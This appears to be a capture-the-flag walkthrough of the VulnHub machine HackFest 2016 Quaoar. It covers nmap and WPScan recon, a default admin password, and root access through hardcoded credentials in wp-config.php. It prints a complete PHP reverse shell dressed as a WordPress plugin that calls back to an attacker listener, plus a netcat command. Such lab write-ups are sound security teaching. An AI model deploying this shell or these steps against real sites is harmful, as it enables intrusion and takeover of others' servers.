# HackFest 2016: Quaoar CTF Walkthrough
[VulnHub URL]
## Description:
```
Welcome to Quaoar
This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/
Difficulty : Very Easy
Tips:
Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)
Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box
Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing
SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753
You may have issues with VMware 
```
## Contents:

	1. Initial scanning & recon
	2. Shelling the system using a malicious Wordpress plugin
	3. Gaining root through hardcoded database credentials
### Initial scanning & recon

Scans performed:
 - Nmap
 - Uniscan
 - WPscan

Nmap:
```
nmap -p- -A 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up (0.0013s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA TOP SASL UIDL RESP-CODES STLS PIPELINING
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-03-24T17:47:54+00:00; -1s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LITERAL+ IDLE have STARTTLS Pre-login ENABLE listed SASL-IR capabilities post-login ID OK LOGIN-REFERRALS LOGINDISABLEDA0001 more IMAP4rev1
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-03-24T17:47:54+00:00; -1s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: IDLE LITERAL+ have Pre-login ENABLE listed SASL-IR capabilities post-login ID OK LOGIN-REFERRALS AUTH=PLAINA0001 more IMAP4rev1
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-03-24T17:47:53+00:00; -2s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: CAPA TOP USER UIDL RESP-CODES SASL(PLAIN) PIPELINING
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-03-24T17:47:53+00:00; -2s from scanner time.
MAC Address: 08:00:27:CE:A9:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-03-24T13:47:54-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```
This is quite a wall of text, so here's a list of the open ports:
```
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      ISC BIND 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
```

Uniscan:

```
| Directory check:
| [+] CODE: 200 URL: http://192.168.56.101/wordpress/
| [+] CODE: 200 URL: http://192.168.56.101/upload/
|
| File check:
| [+] CODE: 200 URL: http://192.168.56.101/index.html
| [+] CODE: 200 URL: http://192.168.56.101/robots.txt
|
| Check robots.txt:
| [+] Disallow: Hackers
| [+] Allow: /wordpress/
| [+]    ____
| [+] #  /___ \_   _  __ _  ___   __ _ _ __
| [+] # //  / / | | |/ _` |/ _ \ / _` | '__|
| [+] #/ \_/ /| |_| | (_| | (_) | (_| | |
| [+] #\___,_\ \__,_|\__,_|\___/ \__,_|_|
| [+]
|
| Check sitemap.xml:
```
The above output only comprises of the useful details, I would recommend using tools like Nikto and Dirb for a better scan of web applications.
However, we can see `robots.txt` has an entry regarding `/wordpress/`.
With this in mind, I can also make the assumption that directories like `/wp-content/` and `/wp-login/` are present.

Now I can be sure that WordPress is running on the target, I can use WPscan to grab more specific info. I didn't have to look into the vulnerable plugins that were mentioned in the output, so I decided to omit them from this walkthrough. WPscan enumerated the users for me:
```
+----+--------+--------+
| Id | Login  | Name   |
+----+--------+--------+
| 1  | admin  | admin  |
| 2  | wpuser | wpuser |
+----+--------+--------+
```

So now I know that 'admin' exists, I might as well guess a few passwords.
Turns out the admin password was **admin**...

### Shelling the system using a malicious Wordpress plugin

Now from past experience with having to pop shells on WordPress sites, I decided to get on with it and make a dummy plugin. 
Here's how to do that:
 1. Either create or use a web shell - I generally use [PentestMonkey's PHP Shell] or the [b374k shell].
 2. Afterwards, you have to edit the code to fit your local host and local port. For example, if you were to use PentestMonkey's shell:
 ```
 $ip = '192.168.56.1';  // CHANGE THIS
 $port = 1337;       // CHANGE THIS
 ```
 3. Format the PHP code to fit the requirements for WP Plugins - After looking at the [WP Plugin Handbook], it seems that plugins need a header in-order for it to successfully install. After making the edits, this was the final code:
 ```php
 <?php
/*
Plugin Name: WordPress.org Plugin
Plugin URI:  https://developer.wordpress.org/plugins/the-basics/
Description: Basic WordPress Plugin Header Comment
Version:     20160911
Author:      WordPress.org
Author URI:  https://developer.wordpress.org/
License:     GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Text Domain: wporg
Domain Path: /languages
*/

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.1';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
 ```
 4. Zip the file and Upload - After the PHP code has been properly formatted, just go ahead and zip it up, then manually install a third-party plugin from the admin's dashboard.

**NOTE:** Before you click 'Install', open up Netcat in order to catch the incoming connection:
```
nc -lvp 1337
```
After that, a connection opens and I've got a shell.

### Gaining root through hardcoded database credentials

As I've said in previous walkthroughs, I don't do post-exploitation very well.
Thankfully, this stage of the challenge is fairly easy.

Looking into the `/home/` directory shows the `wpadmin` user, which can be accessed using the shell:
```
$ ls -alt
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2016 .
drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
$ cd wpadmin
$ ls
flag.txt
```
There's one of the required flags:
**2bafe61f03117ac66a73c3c514de796e**

So to quickly summarise, two goals have been met, now it's time to get root and fully pwn the first machine. Luckily, this isn't the hardest thing to do. Due to WordPress being on the server, `/var/www/wordpress/wp-config.php` has to hold something useful:
```
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');
```
Yikes.

Time to SSH into the box as root:
```
root@192.168.56.101's password:
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

* Documentation:  https://help.ubuntu.com/

  System information as of Sat Apr 29 09:37:03 EDT 2017

  System load:  0.02              Processes:             99
  Usage of /:   29.9% of 7.21GB   Users logged in:       0
  Memory usage: 38%               IP address for eth0:   192.168.56.101
  Swap usage:   0%                IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sat Apr 29 09:20:34 2017 from 192.168.56.1
root@Quaoar:~#
```
Browsing to `/root/` gives the final `flag.txt`, which contains the value:
**8e3f9ec016e3598c5eec11fd3d73f6fb**

[VulnHub URL]: <https://www.vulnhub.com/entry/hackfest2016-quaoar,180/>
[PentestMonkey's PHP Shell]: <http://pentestmonkey.net/tools/web-shells/php-reverse-shell>
[b374k shell]: <https://github.com/kieran-walker-0/b374k>
[WP Plugin Handbook]: <https://developer.wordpress.org/plugins/the-basics/header-requirements/>
